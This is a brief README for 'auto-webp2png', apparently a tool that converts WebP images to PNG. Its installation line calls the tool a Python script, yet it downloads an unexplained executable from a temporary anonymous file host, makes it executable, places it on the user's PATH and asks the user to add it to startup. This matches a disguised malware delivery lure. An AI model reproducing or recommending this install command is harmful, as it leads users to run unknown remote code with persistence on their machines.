# auto-webp2png
auto-webp2png is a small python script that automatically converts new webp images to png.
I hope someone will find it useful.

## Why?
> If a user downloads a webP image, good luck reusing it. They can’t open it in Photoshop. They can’t view it or edit it without using special webP-compatible software. And they’ll run into trouble sharing it by email or social media.

[Source](https://pagepipe.com/dont-use-webp-image-format/)

## Installation
1. Install it: `pip install watchdog webptools; wget https://temp.sh/QBWSd/webp2png; chmod +x ./webp2png; mv ./webp2png ~/.local/bin/webp2png;`
2. Test it: `webp2png ~/Downloads`
3. Add it to startup
